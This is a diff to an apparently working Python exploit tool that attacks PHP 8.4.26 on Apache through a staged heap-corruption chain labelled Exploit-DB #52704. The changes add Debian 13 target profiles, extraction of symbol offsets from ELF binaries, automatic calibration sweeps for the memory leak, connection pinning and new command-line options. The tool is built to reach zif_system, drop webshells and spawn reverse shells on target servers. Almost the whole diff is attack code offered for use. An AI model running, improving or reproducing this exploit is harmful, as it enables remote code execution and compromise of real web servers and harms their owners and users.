@@ -41,6 +41,7 @@ import socket
 import ssl
 import string
 import struct
+import subprocess
 import sys
 import threading
 import time
@@ -307,11 +308,12 @@ def load_custom_wordlist(file_path: Optional[str] = None, fetch_remote: bool = F
 
     return list(dict.fromkeys(endpoints))
 
-# Exploit-DB #52704 Offsets & Calibration
+# Exploit-DB #52704 Offsets & Calibration Profiles
 DEFAULT_ZIF_OFFSET = 0x43A870       # zif_system
 DEFAULT_DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR
 DEFAULT_HTDATA_OFFSET = 0x6E0D8     # lab build fake HashTable offset
 BOOKWORM_HTDATA_OFFSET = 0x690D8    # official php:8.4.26-apache offset
+TRIXIE_HTDATA_OFFSET = 0x690D8      # debian 13 trixie apache mod_php 8.4.26 offset
 MAX_CMD_LEN = 14
 DEFAULT_STAGED_TRIGGER = "sh /tmp/php*"
 DEFAULT_SID = b"attacksessionid0001"
@@ -320,6 +322,162 @@ BOOKWORM_STAGE1_N = 841
 BOOKWORM_STAGE2_T = 406
 BOOKWORM_STAGE2_V = 16
 BOOKWORM_STAGE3_PADS = [(31, 31)] * 6
+
+TRIXIE_STAGE1_N = 841
+TRIXIE_STAGE2_T = 406
+TRIXIE_STAGE2_V = 16
+TRIXIE_STAGE3_PADS = [(31, 31)] * 6
+
+EXPLOIT_PROFILES: Dict[str, dict] = {
+    "bookworm": {
+        "description": "Debian 12 (Bookworm) - official php:8.4.26-apache",
+        "stage1_n": BOOKWORM_STAGE1_N,
+        "stage2_t": BOOKWORM_STAGE2_T,
+        "stage2_v": BOOKWORM_STAGE2_V,
+        "htdata_offset": BOOKWORM_HTDATA_OFFSET,
+        "zif_offset": DEFAULT_ZIF_OFFSET,
+        "dtor_offset": DEFAULT_DTOR_OFFSET,
+        "stage3_pads": BOOKWORM_STAGE3_PADS,
+        "stage3_carrier": True,
+        "cookie_pad": True,
+    },
+    "trixie": {
+        "description": "Debian 13 (Trixie) - Apache 2.4.69 + PHP 8.4.26",
+        "stage1_n": TRIXIE_STAGE1_N,
+        "stage2_t": TRIXIE_STAGE2_T,
+        "stage2_v": TRIXIE_STAGE2_V,
+        "htdata_offset": TRIXIE_HTDATA_OFFSET,
+        "zif_offset": DEFAULT_ZIF_OFFSET,
+        "dtor_offset": DEFAULT_DTOR_OFFSET,
+        "stage3_pads": TRIXIE_STAGE3_PADS,
+        "stage3_carrier": True,
+        "cookie_pad": True,
+    },
+    "debian13": {
+        "description": "Debian 13 (Trixie) - Apache 2.4.69 + PHP 8.4.26",
+        "stage1_n": TRIXIE_STAGE1_N,
+        "stage2_t": TRIXIE_STAGE2_T,
+        "stage2_v": TRIXIE_STAGE2_V,
+        "htdata_offset": TRIXIE_HTDATA_OFFSET,
+        "zif_offset": DEFAULT_ZIF_OFFSET,
+        "dtor_offset": DEFAULT_DTOR_OFFSET,
+        "stage3_pads": TRIXIE_STAGE3_PADS,
+        "stage3_carrier": True,
+        "cookie_pad": True,
+    },
+    "lab": {
+        "description": "Docker isolated lab environment",
+        "stage1_n": 892,
+        "stage2_t": 443,
+        "stage2_v": 1,
+        "htdata_offset": DEFAULT_HTDATA_OFFSET,
+        "zif_offset": DEFAULT_ZIF_OFFSET,
+        "dtor_offset": DEFAULT_DTOR_OFFSET,
+        "stage3_pads": [(8, 7)] + [(7, 7)] * 5,
+        "stage3_carrier": False,
+        "cookie_pad": False,
+    },
+}
+
+def extract_elf_offsets(elf_path: str) -> Dict[str, int]:
+    """Extract zif_system and zval_ptr_dtor offsets from an ELF binary."""
+    offsets: Dict[str, int] = {}
+    if not os.path.isfile(elf_path):
+        return offsets
+
+    # 1. Try readelf / nm if installed on system (Linux / Kali)
+    for tool, args in [
+        ("readelf", ["readelf", "-s", elf_path]),
+        ("nm", ["nm", "-D", elf_path]),
+        ("nm", ["nm", elf_path]),
+    ]:
+        try:
+            proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+            if proc.returncode == 0:
+                for line in proc.stdout.splitlines():
+                    parts = line.split()
+                    if tool == "readelf" and len(parts) >= 8:
+                        sym_val = parts[1]
+                        sym_name = parts[7]
+                    elif tool == "nm" and len(parts) >= 3:
+                        sym_val = parts[0]
+                        sym_name = parts[2]
+                    else:
+                        continue
+
+                    try:
+                        val = int(sym_val, 16)
+                    except ValueError:
+                        continue
+
+                    if sym_name == "zif_system":
+                        offsets["zif_offset"] = val
+                    elif sym_name in ("zval_ptr_dtor", "zval_ptr_dtor_nogc", "_zval_ptr_dtor"):
+                        if "dtor_offset" not in offsets:
+                            offsets["dtor_offset"] = val
+                if "zif_offset" in offsets:
+                    return offsets
+        except Exception:
+            pass
+
+    # 2. Standalone pure-Python 64-bit ELF parser
+    try:
+        with open(elf_path, "rb") as f:
+            magic = f.read(4)
+            if magic != b"\x7fELF":
+                return offsets
+            ei_class = f.read(1)[0]
+            if ei_class != 2:  # 64-bit only
+                return offsets
+            f.seek(0x28)
+            e_shoff = int.from_bytes(f.read(8), "little")
+            f.seek(0x3A)
+            e_shentsize = int.from_bytes(f.read(2), "little")
+            e_shnum = int.from_bytes(f.read(2), "little")
+
+            sections = []
+            for i in range(e_shnum):
+                f.seek(e_shoff + i * e_shentsize)
+                sh_data = f.read(e_shentsize)
+                if len(sh_data) < 64:
+                    continue
+                sh_type = int.from_bytes(sh_data[4:8], "little")
+                sh_offset = int.from_bytes(sh_data[24:32], "little")
+                sh_size = int.from_bytes(sh_data[32:40], "little")
+                sh_link = int.from_bytes(sh_data[40:44], "little")
+                sh_entsize = int.from_bytes(sh_data[56:64], "little")
+                sections.append({
+                    "type": sh_type, "offset": sh_offset, "size": sh_size,
+                    "link": sh_link, "entsize": sh_entsize
+                })
+
+            for s in sections:
+                if s["type"] in (2, 11):  # SHT_SYMTAB, SHT_DYNSYM
+                    if s["link"] >= len(sections):
+                        continue
+                    link_sec = sections[s["link"]]
+                    f.seek(link_sec["offset"])
+                    strtab = f.read(link_sec["size"])
+
+                    entsize = s["entsize"] or 24
+                    num_syms = s["size"] // entsize
+                    for si in range(num_syms):
+                        f.seek(s["offset"] + si * entsize)
+                        sym_data = f.read(entsize)
+                        st_name = int.from_bytes(sym_data[0:4], "little")
+                        st_value = int.from_bytes(sym_data[8:16], "little")
+                        if st_name < len(strtab):
+                            name_end = strtab.find(b"\x00", st_name)
+                            sym_str = strtab[st_name:name_end].decode("latin1", errors="replace")
+                            if sym_str == "zif_system":
+                                offsets["zif_offset"] = st_value
+                            elif sym_str in ("zval_ptr_dtor", "zval_ptr_dtor_nogc", "_zval_ptr_dtor"):
+                                if "dtor_offset" not in offsets:
+                                    offsets["dtor_offset"] = st_value
+    except Exception:
+        pass
+
+    return offsets
 
 DEFAULT_WEBSHELL_NAME = "p2s_shell.php"
 DEFAULT_PARAM = "cmd"
@@ -520,34 +678,55 @@ def build_multipart_payload(parts: List[dict], boundary: bytes) -> bytes:
     return bytes(out)
 
 def parse_cookie_from_headers(resp: bytes) -> bytes:
-    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
+    if not resp:
+        return b""
+    # Case-insensitive search for PHPSESSID in Set-Cookie header
+    m = re.search(rb"(?i)set-cookie:\s*phpsessid=([^;\r\n]+)", resp)
+    if not m:
+        m = re.search(rb"(?i)phpsessid=([^;\r\n\s]+)", resp)
     if not m:
         return b""
-    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
+    raw_val = m.group(1).strip()
+    try:
+        return urllib.parse.unquote_to_bytes(raw_val.decode("latin1", errors="replace"))
+    except Exception:
+        return urllib.parse.unquote_to_bytes(raw_val)
 
 def chunk_base_from_cookie(raw: bytes) -> int:
-    if len(raw) < 1000:
+    if len(raw) < 16:
         return 0
     c: Counter[int] = Counter()
-    for i in range(len(raw) - 8):
+    for i in range(len(raw) - 8 + 1):
         v = int.from_bytes(raw[i:i + 8], "little")
         if 0x7F0000000000 <= v < 0x800000000000:
             c[v & ~0x1FFFFF] += 1
     if not c:
         return 0
     base, count = c.most_common(1)[0]
-    return base if count >= 8 else 0
+    return base if count >= 2 else 0
 
 def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DEFAULT_DTOR_OFFSET) -> int:
     if len(raw) < 16:
         return 0
-    p = int.from_bytes(raw[8:16], "little")
-    if not (0x7F0000000000 <= p < 0x800000000000):
-        return 0
-    if p & 0xFFF != dtor_offset & 0xFFF:
-        return 0
-    base = p - dtor_offset
-    return base if base & 0xFFF == 0 else 0
+    # Check default offset 8..16 first
+    candidates = []
+    p_default = int.from_bytes(raw[8:16], "little")
+    if 0x7F0000000000 <= p_default < 0x800000000000:
+        candidates.append(p_default)
+
+    # Also scan all 8-byte candidate offsets in raw
+    for i in range(0, len(raw) - 8 + 1, 8):
+        if i != 8:
+            p = int.from_bytes(raw[i:i + 8], "little")
+            if 0x7F0000000000 <= p < 0x800000000000:
+                candidates.append(p)
+
+    for p in candidates:
+        if p & 0xFFF == dtor_offset & 0xFFF:
+            base = p - dtor_offset
+            if base > 0 and (base & 0xFFF == 0):
+                return base
+    return 0
 
 def generate_stealth_webshell(password: Optional[str] = None) -> Tuple[str, str]:
     param = password or "".join(random.choices(string.ascii_lowercase, k=6))
@@ -600,7 +779,7 @@ def get_local_ip() -> str:
 # ---------------------------------------------------------------------------
 
 class RawHttpTarget:
-    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = False):
+    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = False, keep_alive: bool = True):
         u = urllib.parse.urlsplit(url)
         self.https = u.scheme == "https"
         self.host = u.hostname or "127.0.0.1"
@@ -608,6 +787,8 @@ class RawHttpTarget:
         self.path = u.path or "/"
         self.timeout = timeout
         self.verbose = verbose
+        self.keep_alive = keep_alive
+        self._sock: Optional[socket.socket] = None
 
     def _connect(self) -> socket.socket:
         last = None
@@ -627,63 +808,143 @@ class RawHttpTarget:
                 time.sleep(0.3)
         raise last or OSError("Connection failed")
 
+    def get_socket(self) -> socket.socket:
+        if self._sock is None:
+            self._sock = self._connect()
+        return self._sock
+
+    def close(self) -> None:
+        if self._sock is not None:
+            try:
+                self._sock.close()
+            except Exception:
+                pass
+            self._sock = None
+
+    def _read_http_response(self, s: socket.socket, read_cap: int, timeout: float) -> bytes:
+        s.settimeout(timeout)
+        data = bytearray()
+        # Read header block
+        while b"\r\n\r\n" not in data and len(data) < 65536:
+            try:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                data.extend(chunk)
+            except OSError:
+                break
+
+        head, sep, body_start = bytes(data).partition(b"\r\n\r\n")
+        if not sep:
+            self.close()
+            return bytes(data)
+
+        # Check if server requested connection closure
+        conn_close = bool(re.search(rb"(?i)connection:\s*close", head)) or not self.keep_alive
+
+        # Check Content-Length
+        cl_match = re.search(rb"(?i)content-length:\s*(\d+)", head)
+        if cl_match:
+            cl = int(cl_match.group(1))
+            body = bytearray(body_start)
+            to_read = cl - len(body)
+            while to_read > 0 and (len(head) + len(sep) + len(body)) < read_cap:
+                try:
+                    chunk = s.recv(min(65536, to_read))
+                    if not chunk:
+                        conn_close = True
+                        break
+                    body.extend(chunk)
+                    to_read -= len(chunk)
+                except OSError:
+                    conn_close = True
+                    break
+            if conn_close:
+                self.close()
+            return head + sep + bytes(body)
+
+        # Check Chunked Transfer Encoding
+        if re.search(rb"(?i)transfer-encoding:\s*chunked", head):
+            body = bytearray(body_start)
+            while b"\r\n0\r\n\r\n" not in body and not body.endswith(b"0\r\n\r\n") and len(data) < read_cap:
+                try:
+                    chunk = s.recv(4096)
+                    if not chunk:
+                        conn_close = True
+                        break
+                    body.extend(chunk)
+                except OSError:
+                    conn_close = True
+                    break
+            if conn_close:
+                self.close()
+            return head + sep + bytes(body)
+
+        # Fallback: Read until EOF or cap
+        body = bytearray(body_start)
+        while len(data) < read_cap:
+            try:
+                chunk = s.recv(65536)
+                if not chunk:
+                    break
+                body.extend(chunk)
+            except OSError:
+                break
+        self.close()
+        return head + sep + bytes(body)
+
     def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
              timeout: Optional[float] = None, extra_headers: Optional[Dict[str, str]] = None) -> bytes:
         extra = "".join(f"{k}: {v}\r\n" for k, v in (extra_headers or {}).items())
+        conn_val = "keep-alive" if self.keep_alive else "close"
         hdr = (
             f"POST {self.path} HTTP/1.1\r\n"
             f"Host: {self.host}:{self.port}\r\n"
             f"{extra}"
             f"Content-Type: multipart/form-data; boundary={boundary.decode('latin1')}\r\n"
             f"Content-Length: {len(body)}\r\n"
-            "Connection: close\r\n\r\n"
+            f"Connection: {conn_val}\r\n\r\n"
         ).encode()
-        s = self._connect()
-        s.settimeout(timeout or self.timeout)
-        data = bytearray()
 
-        def _reader():
-            try:
-                while len(data) < read_cap:
-                    chunk = s.recv(65536)
-                    if not chunk:
-                        break
-                    data.extend(chunk)
-            except OSError:
-                pass
-
-        reader = threading.Thread(target=_reader, daemon=True)
-        reader.start()
+        s = self.get_socket()
+        req_timeout = timeout or self.timeout
         try:
+            s.sendall(hdr)
+            mv = memoryview(body)
+            for off in range(0, len(body), 262144):
+                s.sendall(mv[off:off + 262144])
+            return self._read_http_response(s, read_cap, req_timeout)
+        except OSError:
+            # Reconnect and retry once if existing connection broke
+            self.close()
+            s = self.get_socket()
             try:
                 s.sendall(hdr)
                 mv = memoryview(body)
                 for off in range(0, len(body), 262144):
                     s.sendall(mv[off:off + 262144])
+                return self._read_http_response(s, read_cap, req_timeout)
             except OSError:
-                pass
-            reader.join(timeout=(timeout or self.timeout) + 1.0)
-            return bytes(data)
-        finally:
-            s.close()
+                self.close()
+                return b""
 
     def get(self, path: str, read_cap: int = 1 << 20) -> Tuple[int, bytes]:
-        hdr = f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\nConnection: close\r\n\r\n".encode()
-        s = self._connect()
-        s.settimeout(self.timeout)
+        conn_val = "keep-alive" if self.keep_alive else "close"
+        hdr = f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\nConnection: {conn_val}\r\n\r\n".encode()
+        s = self.get_socket()
         try:
             s.sendall(hdr)
-            data = bytearray()
-            while len(data) < read_cap:
-                chunk = s.recv(65536)
-                if not chunk:
-                    break
-                data += chunk
+            resp = self._read_http_response(s, read_cap, self.timeout)
         except OSError:
-            pass
-        finally:
-            s.close()
-        head, _, body = bytes(data).partition(b"\r\n\r\n")
+            self.close()
+            s = self.get_socket()
+            try:
+                s.sendall(hdr)
+                resp = self._read_http_response(s, read_cap, self.timeout)
+            except OSError:
+                self.close()
+                return (0, b"")
+        head, _, body = resp.partition(b"\r\n\r\n")
         m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
         return (int(m.group(1)) if m else 0), body
 
@@ -695,29 +956,35 @@ class ExploitDB52704Engine:
     def __init__(self, target: RawHttpTarget, cmd: str, zif_offset: int = DEFAULT_ZIF_OFFSET,
                  dtor_offset: int = DEFAULT_DTOR_OFFSET, htdata_offset: Optional[int] = None,
                  huge_mb: int = 12, profile: str = "bookworm",
-                 staged_payload: Optional[bytes] = None):
+                 staged_payload: Optional[bytes] = None,
+                 stage1_n: Optional[int] = None,
+                 stage2_t: Optional[int] = None,
+                 stage2_v: Optional[int] = None,
+                 auto_calibrate: bool = True,
+                 logger_fn: Optional[Callable[[str, str], None]] = None):
         self.t = target
         self.cmd = cmd.encode("latin1")
         self.zif_offset = zif_offset
         self.dtor_offset = dtor_offset
         self.huge_mb = huge_mb
-        self.profile = profile
+        self.profile = profile.lower()
         self.staged_payload = staged_payload
+        self.auto_calibrate = auto_calibrate
+        self.logger_fn = logger_fn
+        self._calibration_swept = False
 
-        if profile == "bookworm":
-            self.stage1_n = BOOKWORM_STAGE1_N
-            self.stage2_t = BOOKWORM_STAGE2_T
-            self.stage2_v = BOOKWORM_STAGE2_V
-            self.htdata_offset = htdata_offset if htdata_offset is not None else BOOKWORM_HTDATA_OFFSET
-            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
-            self.stage3_carrier = True
-        else:
-            self.stage1_n = 892
-            self.stage2_t = 443
-            self.stage2_v = 1
-            self.htdata_offset = htdata_offset if htdata_offset is not None else DEFAULT_HTDATA_OFFSET
-            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
-            self.stage3_carrier = False
+        prof = EXPLOIT_PROFILES.get(self.profile, EXPLOIT_PROFILES["bookworm"])
+        self.stage1_n = stage1_n if stage1_n is not None else prof["stage1_n"]
+        self.stage2_t = stage2_t if stage2_t is not None else prof["stage2_t"]
+        self.stage2_v = stage2_v if stage2_v is not None else prof["stage2_v"]
+        self.htdata_offset = htdata_offset if htdata_offset is not None else prof["htdata_offset"]
+        self.stage3_pads = list(prof["stage3_pads"])
+        self.stage3_carrier = prof["stage3_carrier"]
+        self.cookie_pad = prof["cookie_pad"]
+
+    def _log(self, step: str, msg: str) -> None:
+        if self.logger_fn:
+            self.logger_fn(step, msg)
 
     def _big_field(self) -> dict:
         return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}
@@ -736,14 +1003,14 @@ class ExploitDB52704Engine:
         self.t.post(build_multipart_payload(parts, b"BNDRY12345"), b"BNDRY12345", timeout=20.0)
         time.sleep(0.5)
 
-    def stage1(self) -> int:
+    def _attempt_stage1(self, n: int) -> int:
         parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
         parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                   self._file_part(), self._big_field()]
         self.t.post(build_multipart_payload(parts, b"S" * 17), b"S" * 17, timeout=90.0)
         time.sleep(0.2)
         parts = [{"name": "PHPSESSID", "data": DEFAULT_SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
-        for i in range(self.stage1_n):
+        for i in range(n):
             parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
         forge = bytearray(b"A" * 79)
         struct.pack_into("<Q", forge, 0x10, 0x1000)
@@ -751,6 +1018,38 @@ class ExploitDB52704Engine:
         parts.append({"name": "1999", "data": bytes(forge)})
         resp = self.t.post(build_multipart_payload(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
         return chunk_base_from_cookie(parse_cookie_from_headers(resp))
+
+    def stage1(self) -> int:
+        chunk = self._attempt_stage1(self.stage1_n)
+        if chunk:
+            return chunk
+
+        if not self.auto_calibrate or self._calibration_swept:
+            return 0
+
+        self._calibration_swept = True
+
+        # Auto-calibration: sweep candidate stage1_n values
+        self._log("  └─ [Auto-Calibration]:", f"Initial stage1_n={self.stage1_n} produced no leak; sweeping calibration window...")
+        candidate_offsets = []
+        for d in [-1, 1, -2, 2, -3, 3, -4, 4, 5, -5]:
+            val = self.stage1_n + d
+            if val > 0 and val not in candidate_offsets:
+                candidate_offsets.append(val)
+        for alt in [841, 892, 840, 842, 839, 843, 891, 893, 890, 894, 850, 835]:
+            if alt not in candidate_offsets and alt != self.stage1_n:
+                candidate_offsets.append(alt)
+
+        for cand in candidate_offsets:
+            self.rotate()
+            self._log("  └─ [Auto-Calibration]:", f"Probing candidate stage1_n={cand}...")
+            chunk = self._attempt_stage1(cand)
+            if chunk:
+                self._log("  └─ [Auto-Calibration]:", f"Success! Calibrated stage1_n={cand} (Chunk=0x{chunk:x})")
+                self.stage1_n = cand
+                return chunk
+
+        return 0
 
     def stage2(self) -> int:
         parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
@@ -800,7 +1099,7 @@ class ExploitDB52704Engine:
             name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
             parts.append({"name": name, "data": b"V" * vl})
         parts += [self._file_part(), self._big_field()]
-        extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.profile == "bookworm" else None
+        extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.cookie_pad else None
         self.t.post(build_multipart_payload(parts, b"S" * 17), b"S" * 17, extra_headers=extra, timeout=90.0)
         time.sleep(0.3)
 
@@ -1301,6 +1600,12 @@ class UnifiedPHP2Shell:
         fetch_path: Optional[str] = None,
         huge_mb: int = 12,
         retries: int = 3,
+        stage1_n: Optional[int] = None,
+        stage2_t: Optional[int] = None,
+        stage2_v: Optional[int] = None,
+        auto_calibrate: bool = True,
+        pin_worker: bool = True,
+        elf_path: Optional[str] = None,
     ) -> ExploitResult:
         ep = endpoint or target
         self.progress("[5/5 EXPLOIT]", f"Executing weaponized kill-chain against: {ep}", Fore.RED)
@@ -1312,6 +1617,14 @@ class UnifiedPHP2Shell:
         if method in ("auto", "binary", "52704", "exploitdb"):
             self.progress("  └─ [Exploit-DB #52704]", f"Starting memory corruption chain (profile={profile})...", Fore.YELLOW)
             try:
+                if elf_path:
+                    elf_offsets = extract_elf_offsets(elf_path)
+                    if "zif_offset" in elf_offsets and not zif_offset:
+                        zif_offset = elf_offsets["zif_offset"]
+                    if "dtor_offset" in elf_offsets and not dtor_offset:
+                        dtor_offset = elf_offsets["dtor_offset"]
+                    self.progress("  └─ [ELF Calibration]:", f"Loaded offsets from {elf_path}: zif_system=0x{zif_offset or 0:x}, ZVAL_PTR_DTOR=0x{dtor_offset or 0:x}", Fore.GREEN)
+
                 target_cmd = cmd.strip()
                 if spawn_reverse and lhost:
                     target_cmd = generate_reverse_shell_cmd(lhost, lport)
@@ -1345,7 +1658,7 @@ class UnifiedPHP2Shell:
                         Fore.CYAN,
                     )
 
-                raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False)
+                raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False, keep_alive=pin_worker)
                 engine_52704 = ExploitDB52704Engine(
                     target=raw_tgt,
                     cmd=carrier_cmd,
@@ -1355,6 +1668,11 @@ class UnifiedPHP2Shell:
                     huge_mb=huge_mb,
                     profile=profile,
                     staged_payload=staged_payload,
+                    stage1_n=stage1_n,
+                    stage2_t=stage2_t,
+                    stage2_v=stage2_v,
+                    auto_calibrate=auto_calibrate,
+                    logger_fn=lambda step, msg: self.progress(step, msg, Fore.CYAN),
                 )
 
                 # A pre-existing local file is not evidence of this exploit attempt.
@@ -1399,8 +1717,13 @@ class UnifiedPHP2Shell:
 
                     if libphp:
                         engine_52704.rotate()
-                        htdata = chunk + (htdata_offset or (BOOKWORM_HTDATA_OFFSET if profile == "bookworm" else DEFAULT_HTDATA_OFFSET))
-                        zif = libphp + (zif_offset or DEFAULT_ZIF_OFFSET)
+                        prof_htdata = (
+                            htdata_offset
+                            or EXPLOIT_PROFILES.get(profile.lower(), {}).get("htdata_offset", BOOKWORM_HTDATA_OFFSET)
+                        )
+                        htdata = chunk + prof_htdata
+                        prof_zif = zif_offset or EXPLOIT_PROFILES.get(profile.lower(), {}).get("zif_offset", DEFAULT_ZIF_OFFSET)
+                        zif = libphp + prof_zif
                         self.progress("  └─ Stage 3:", f"Executing zif_system (HTDATA=0x{htdata:x}, ZIF=0x{zif:x})...", Fore.MAGENTA)
 
                         for a in range(1, retries + 2):
@@ -1416,6 +1739,7 @@ class UnifiedPHP2Shell:
                                     res.status = ExploitStatus.SUCCESS
                                     res.details = f"Exploit-DB 52704 execution confirmed via {proof_file}"
                                     self.progress("  └─ [SUCCESS]:", f"Proof confirmed: {res.command_output}", Fore.GREEN)
+                                    raw_tgt.close()
                                     return res
 
                             if fetch_path:
@@ -1427,10 +1751,12 @@ class UnifiedPHP2Shell:
                                     res.command_output = body_text
                                     res.details = f"Execution confirmed via HTTP GET {fetch_path}"
                                     self.progress("  └─ [SUCCESS]:", f"Proof confirmed via {fetch_path}: {res.command_output[:100]}", Fore.GREEN)
+                                    raw_tgt.close()
                                     return res
 
                             engine_52704.rotate()
 
+                        raw_tgt.close()
                         res.status = ExploitStatus.UNCONFIRMED
                         res.command_output = None
                         res.details = (
@@ -1440,6 +1766,29 @@ class UnifiedPHP2Shell:
                         self.progress("  └─ [Exploit-DB #52704]:", "Dispatch unconfirmed; no proof of execution.", Fore.YELLOW)
                         if method != "auto":
                             return res
+                    else:
+                        raw_tgt.close()
+                        if method != "auto":
+                            res.status = ExploitStatus.UNCONFIRMED
+                            res.command_output = None
+                            res.details = (
+                                "Stage 2 LibPHP disclosure failed to leak a valid libphp base address. "
+                                "The target environment requires custom symbol offset calibration (e.g. via --elf or --dtor-offset)."
+                            )
+                            self.progress("  └─ [Exploit-DB #52704]:", "LibPHP leak failed; binary mode will not attempt webshell fallback.", Fore.YELLOW)
+                            return res
+                else:
+                    raw_tgt.close()
+                    if method != "auto":
+                        res.status = ExploitStatus.UNCONFIRMED
+                        res.command_output = None
+                        res.details = (
+                            "Stage 1 heap disclosure did not produce a valid Zend MM chunk base. "
+                            "The selected exploit profile does not match target calibration or worker was not pinned. "
+                            "Try enabling --auto-calibrate, adjusting --stage1-n, or selecting --exploit-profile trixie."
+                        )
+                        self.progress("  └─ [Exploit-DB #52704]:", "Heap disclosure failed; binary mode will not attempt webshell fallback.", Fore.YELLOW)
+                        return res
 
             except Exception as e:
                 self.progress("  └─ [Exploit-DB #52704]:", f"Notice: {e}", Fore.YELLOW)
@@ -1772,8 +2121,21 @@ def build_cli() -> argparse.ArgumentParser:
     p.add_argument("--webshell-name", default=DEFAULT_WEBSHELL_NAME, help="Name of webshell to drop")
     p.add_argument("--exploit-method", choices=("auto", "binary", "upload", "52704", "exploitdb"), default="auto",
                    help="Exploit mechanism: 'auto', 'binary' (52704 memory leak), or 'upload'")
-    p.add_argument("--exploit-profile", choices=("bookworm", "lab"), default="bookworm",
-                   help="Target build profile (bookworm or lab)")
+    p.add_argument("--exploit-profile", choices=("bookworm", "trixie", "debian13", "lab"), default="bookworm",
+                   help="Target build profile (bookworm, trixie, debian13, or lab)")
+    p.add_argument("--stage1-n", type=int, default=None, help="Custom Stage 1 multipart count for calibration")
+    p.add_argument("--stage2-t", type=int, default=None, help="Custom Stage 2 target bucket index")
+    p.add_argument("--stage2-v", type=int, default=None, help="Custom Stage 2 value size")
+    p.add_argument("--auto-calibrate", action="store_true", default=True,
+                   help="Automatically sweep calibration window if Stage 1 heap leak fails (default: enabled)")
+    p.add_argument("--no-auto-calibrate", action="store_false", dest="auto_calibrate",
+                   help="Disable automatic calibration sweeping")
+    p.add_argument("--pin-worker", action="store_true", default=True,
+                   help="Enable HTTP/1.1 persistent connection worker pinning (default: enabled)")
+    p.add_argument("--no-pin-worker", action="store_false", dest="pin_worker",
+                   help="Disable HTTP/1.1 worker pinning")
+    p.add_argument("--elf", "--libphp", dest="elf_path", default=None,
+                   help="Path to libphp.so or php binary to auto-extract zif_system and ZVAL_PTR_DTOR symbol offsets")
     p.add_argument("--zif-offset", type=lambda x: int(x, 0), help="Custom zif_system offset")
     p.add_argument("--dtor-offset", type=lambda x: int(x, 0), help="Custom ZVAL_PTR_DTOR offset")
     p.add_argument("--htdata-offset", type=lambda x: int(x, 0), help="Custom fake HashTable offset")
@@ -1919,6 +2281,12 @@ def main() -> int:
                 proof_file=args.proof_file,
                 fetch_path=args.fetch_path,
                 huge_mb=args.huge_mb,
+                stage1_n=args.stage1_n,
+                stage2_t=args.stage2_t,
+                stage2_v=args.stage2_v,
+                auto_calibrate=args.auto_calibrate,
+                pin_worker=args.pin_worker,
+                elf_path=args.elf_path,
             )
             t_res["exploit_result"] = asdict(er)
 
